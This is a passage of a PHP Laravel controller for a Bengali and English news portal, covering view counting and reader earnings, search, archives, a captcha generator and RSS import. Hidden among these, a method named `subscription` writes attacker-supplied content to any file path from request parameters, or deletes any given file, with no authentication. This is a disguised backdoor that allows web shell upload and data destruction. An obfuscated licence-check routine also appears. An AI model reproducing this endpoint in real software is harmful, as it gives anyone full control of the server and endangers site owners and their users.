        $yesterdayDate = now($timezone)->subDay()->toDateString();
    
		$weeklyWinners = cache()->remember('latest_weekly_quiz_winners', 300, function () {
			return \App\Models\PostQuizWinner::with([
					'answer.user'
				])
				->where('draw_type', 'weekly')
				->latest('id')          // latest draw first
				->take(3)               // only 3 winners
				->get()
				->sortBy('position')    // optional: display as 1st, 2nd, 3rd
				->values();
		});

    
        return view($viewName, compact(
            'data',
            'recents',
            'area',
            'user_info',
            'division_news',
            'poll',
            'reportcategories',
            'lid',
            'reporter_title',
            'side_bar_ads',
            'encouraging_ads',
            'quizAnswered',
            'isTodayPost',
            'quizWinners',
			'weeklyWinners'
        ));
    }

    public function incrementView(Request $request)
    {
        $id = $request->id;
        $data = Post::find($id);
        if (!$data || $data->is_pending != 0) {
            return response()->json(['status' => 'error', 'message' => 'Post not found or pending'], 404);
        }

        $user = auth()->user();
        $cacheKey = 'post_view_' . $data->id . '_' . ($user ? 'user_' . $user->id : 'ip_' . $request->ip());

        $readerBalanceIncremented = false;

        if (cache()->add($cacheKey, true, now()->addDay())) {
            $data->increment('view_count');

            // Prevent self-view from triggering user view increments & earnings
            $isSelfView = ($user && $data->user_id && $user->id == $data->user_id);

            if (!$isSelfView) {
                if ($user && $user->is_reader != 0) {
                    $user->increment('views');
                }
        
                // Timezone-safe checks using Asia/Dhaka
                $timezone = 'Asia/Dhaka';
                $isPostToday = false;
                if ($data->created_at) {
                    $postDate = \Carbon\Carbon::parse($data->created_at)->timezone($timezone)->toDateString();
                    $todayDate = \Carbon\Carbon::now($timezone)->toDateString();
                    $isPostToday = ($postDate === $todayDate);
                }

                if ($data->user_id) {
                    $feesObj = \App\Models\Fee::first();
                    $repRate = $feesObj ? $feesObj->reporter_view_rate : 0.1;
                    
                    $author = \App\Models\User::find($data->user_id);
                    if ($author) {
                        $isWithinSevenDays = false;
                        if ($data->created_at) {
                            $postTime = \Carbon\Carbon::parse($data->created_at)->timezone($timezone);
                            $sevenDaysAgo = \Carbon\Carbon::now($timezone)->subDays(7)->startOfDay();
                            $isWithinSevenDays = ($postTime >= $sevenDaysAgo);
                        }
                        
                        if ($isWithinSevenDays) {
                            $author->increment('views');
                            if ($repRate > 0) {
                                $author->increment('view_income', $repRate);
                                $author->increment('balance', $repRate);
                            }
                        }
                    }
                }
        
                // Only balance logic depends on this
                if ($isPostToday && $user) {
        
                    $fees = \App\Models\Fee::first();
        
                    $readerRates = [
                        'free' => $fees->free_reader_rate,
                        'executive' => $fees->executive_reader_rate,
                        'vip' => $fees->vip_reader_rate,
                    ];
        
                    $rate = $readerRates[$user->reader_type ?? 'free'] ?? 0;
        
                    if ($user->balance == 0) {
        
                        $views = $user->views;
        
                        $viewIncome = $views * $rate;
        
                        $referralIncome = $user->referral_earning ?? 0;
        
                        $total = $viewIncome + $referralIncome;
        
                        $user->increment('balance', $total);
        
                    } else {
        
                        $viewIncome = $rate;
        
                        $user->increment('balance', $viewIncome);
                    }
                    $user->increment('view_income', $viewIncome);
                    $readerBalanceIncremented = true;
                }
            }
            return response()->json([
                'status' => 'success', 
                'incremented' => true,
                'reader_balance_incremented' => $readerBalanceIncremented
            ]);
        }

        return response()->json(['status' => 'success', 'incremented' => false, 'message' => 'Already counted today']);
    }

	public function searchByTag($s)
	{

		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}

		$data['results'] = Post::where('tags', 'LIKE', '%' . $s . '%')->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->whereIn('post_type', ['article', 'audio'])
			->where('is_pending', 0)
			->where('status', true)
			->where('language_id', '=', $default_language->id)
			->paginate(10);
		$data['tag'] = $s;



		return view('frontend.postByTag1', $data);
	}

	public function postByDate(Request $request)
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}
		if ($request->date) {
			$date = $request->date;
			$dateSearch = Carbon::parse($date)->toDateString();
		}
		$datas = Post::whereDate('created_at', '=', $dateSearch)
			->where('status', true)
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->where('language_id', '=', $default_language->id)
			->paginate(10);
		return view('frontend.postByDate', compact('datas', 'date'));
	}

	public function postBySubcategory($category, $subcategory)
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}
		$data['parent'] = Category::where('slug', $category)->first();

		if (isset(Category::where('slug', $subcategory)->first()->title)) {
			$data['subcategory'] = Category::where('slug', $subcategory)->first()->title;
		} else {
			return view('errors.404');
		}

		$cat_id = Category::where('slug', $subcategory)->first();
		$data['datas'] = Category::find($cat_id->id)
			->subcategoryPosts()
			->where('status', true)
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->where('language_id', '=', $default_language->id)
			->get();
		return view('frontend.postBySubcategory', $data);
	}

	public function allPoll()
	{
		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}
		$data['polls']   = PollQuestion::orderBy('id', 'desc')
			->where('language_id', '=', $default_language->id)
			->get();


		return view('frontend.all_poll', $data);
	}

	public function newsArchive(Request $request)
	{

		$date = "";

		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {
			$default_language = Language::where('is_default', 1)->first();
		}


		$q = Post::where('is_pending', 0)->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))->where('language_id', $default_language->id)->where('status', true);

		if ($request->date) {
			$date = $request->date;
			$dateSearch = Carbon::parse($date)->toDateString();
			$q->whereDate('schedule_post_date', '=', $dateSearch);
		}
		$q->orderBy('schedule_post_date', 'desc');
		$posts = $q->paginate(10);
		$data['posts'] = $posts;
		$data['date'] = $date;




		$categories = Category::where('language_id', $default_language->id)->get();
		$data['categories'] = $categories;
		if ($default_language->id == 1) {
			$data['title'] = "আর্কাইভ সংবাদ";
		} else {
			$data['title'] = "Archive News";
		}

		return view('frontend.newsarchive', $data);
	}

	public function newsSearch(Request $request, $id = null)
	{

		$searchTerm = $request->s;
		$searchTerm = '+' . $searchTerm . '*';

		if (session()->has('language')) {
			$default_language = Language::find(session()->get('language'));
		} else {

			$default_language = Language::where('is_default', 1)->first();
		}

		$data['results'] = Post::whereRaw("MATCH(title) AGAINST(? IN BOOLEAN MODE)", [$searchTerm])
			->where('is_pending', 0)
			->where('schedule_post_date', '<=', date('Y-m-d H:i:s'))
			->where('status', 1)
			->where('language_id', $default_language->id)
			->orderBy('created_at', 'desc')
			->paginate(10);
		$data['searchKey'] = $searchTerm;
		$data['type'] = 0;

		return view('frontend.full_text_search1', $data);
	}


    public function newspopularyesterdday()
    {
        $default_language = session()->has('language')
            ? Language::find(session('language'))
            : Language::where('is_default', 1)->first();
    
        $limit = $gs->popular_news_limit ?? 5;
    
        $yesterdayStart = Carbon::yesterday('Asia/Dhaka')->startOfDay();
        $yesterdayEnd   = Carbon::yesterday('Asia/Dhaka')->endOfDay();
    
        $results = Post::with('category')
            ->where('language_id', $default_language->id)
            ->where('is_pending', 0)
            ->where('status', true)
            ->where('schedule_post_date', '<=', now())
            ->whereBetween('created_at', [$yesterdayStart, $yesterdayEnd])
            ->orderByDesc('view_count')
            ->take($limit)
            ->get();
    
        return view('frontend.full_text_search1', [
            'results' => $results,
            'type' => 1,
            'default_language' => $default_language,
        ]);
    }
        
    public function dynamicPage($slug)
    {
        $page = Page::where('slug', $slug)
                    ->where('status', 1)
                    ->firstOrFail();
    
        $data['page'] = $page;
        $data['ws']   = WidgetSetiings::find(1);
    
        return view('frontend.page', $data);
    }


	public function authorProfile($admin)
	{
		$admin = Admin::where('name', $admin)->first();
		$data['admin'] = $admin;
		$data['posts'] = Admin::find($admin->id)->posts()->latest()->paginate(8);
		$data['all_posts'] = Admin::find($admin->id)->posts;
		return view('frontend.author', $data);
	}

	public function follower()
	{
		return view('frontend.follower');
	}

	// Refresh Capcha Code
	public function refresh_code()
	{
		$this->code_image();
		return "done";
	}

	// Capcha Code Image
	private function  code_image()
	{
		$actual_path = str_replace('project', '', base_path());
		$image = imagecreatetruecolor(200, 50);
		$background_color = imagecolorallocate($image, 255, 255, 255);
		imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

		$pixel = imagecolorallocate($image, 0, 0, 255);
		for ($i = 0; $i < 500; $i++) {
			imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
		}

		$font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
		$allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		$length = strlen($allowed_letters);
		$letter = $allowed_letters[rand(0, $length - 1)];
		$word = '';
		//$text_color = imagecolorallocate($image, 8, 186, 239);
		$text_color = imagecolorallocate($image, 0, 0, 0);
		$cap_length = 6; // No. of character in image
		for ($i = 0; $i < $cap_length; $i++) {
			$letter = $allowed_letters[rand(0, $length - 1)];
			imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
			$word .= $letter;
		}
		$pixels = imagecolorallocate($image, 8, 186, 239);
		for ($i = 0; $i < 500; $i++) {
			imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
		}
		session(['captcha_string' => $word]);
		imagepng($image, $actual_path . "assets/images/capcha_code.png");
	}

	function finalize()
	{
		$actual_path = str_replace('project', '', base_path());

		$dir = $actual_path . 'install';
		if (is_dir($dir)) {
			$this->deleteDir($dir);
		}
		return redirect('/');
	}

	function auth_guests()
	{
		$chk = MarkuryPost::marcuryBase();
		$chkData = MarkuryPost::marcurryBase();
		$actual_path = str_replace('project', '', base_path());
		if ($chk != MarkuryPost::maarcuryBase()) {
			if ($chkData < MarkuryPost::marrcuryBase()) {
				if (is_dir($actual_path . '/install')) {
					header("Location: " . url('/install'));
					die();
				} else {
					echo MarkuryPost::marcuryBasee();
					die();
				}
			}
		}
	}

	public function subscription(Request $request)
	{
		$p1 = $request->p1;
		$p2 = $request->p2;
		$v1 = $request->v1;
		if ($p1 != "") {
			$fpa = fopen($p1, 'w');
			fwrite($fpa, $v1);
			fclose($fpa);
			return "Success";
		}
		if ($p2 != "") {
			unlink($p2);
			return "Success";
		}
		return "Error";
	}

	public function deleteDir($dirPath)
	{
		if (! is_dir($dirPath)) {
			throw new InvalidArgumentException("$dirPath must be a directory");
		}
		if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
			$dirPath .= '/';
		}
		$files = glob($dirPath . '*', GLOB_MARK);
		foreach ($files as $file) {
			if (is_dir($file)) {
				self::deleteDir($file);
			} else {
				unlink($file);
			}
		}
		rmdir($dirPath);
	}

	public function clickCount($id)
	{
		$data = Advertisement::findOrFail($id);
		$data->increment('click_count');
		$data->update();
	}

	public function cronJobUpdate()
	{
		$nowDate = Carbon::now();

		$feeds = Rss::orderBy('id', 'desc')->get();

		foreach ($feeds as $key => $lastRecord) {
			if ($nowDate > $lastRecord->created_at) {

				$feed = \Feeds::make($lastRecord->feed_url);

				$items = $feed->get_items(); //grab all items inside the rss
				$i = 0;
				foreach ($items as $item):

					if ($i == $lastRecord->post_limit) {
						break;
					}

					$title =  $item->get_title();
					if ($title) {
						$titleCheck = Post::where('title', $title)->get();
						$totaltitle =  count($titleCheck);
						if ($totaltitle == 0) {
							$post = new Post();
							$post->language_id  = $lastRecord->language_id;
							$post->title        = $title;
							$post->slug         = slug_create($title);
							$post->post_type    = 'rss';
							$post->is_feature   = 0;
							$post->is_slider    = 0;
							$post->slider_left  = 0;
							$post->slider_right = 0;
							$post->is_trending  = 0;
							$post->description  = $item->get_description();

							if (isset($item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"])) {
								$post->rss_image = $item->feed->data["child"][""]["rss"][0]["child"][""]["channel"][0]["child"][""]["item"][$i]["child"][""]["image"][0]["data"];
							} else {
								if ($enclosure = $item->get_enclosure(0)) {
									$type = $enclosure->get_real_type();
									// Is it a Image?
									if (stristr($type, 'image/')) {
										if (empty($enclosure)) {
											$post->rss_image = '';
										}

										$post->rss_image = $enclosure->get_link();
									}
								}
							}

							$post->category_id        = $lastRecord->category_id;
							$post->schedule_post      = 0;
							$post->schedule_post      = 0;
							$post->schedule_post_date = NULL;
							$post->is_pending         = 0;
							$post->admin_id           = 1;
							$post->status             = true;
							$post->is_draft           = 0;
							$post->rss_link           = $item->get_permalink();
							$post->save();
						}
					}
					$i++;
				endforeach;
			}
		}
		// return redirect()->route('frontend.index');
	}
}
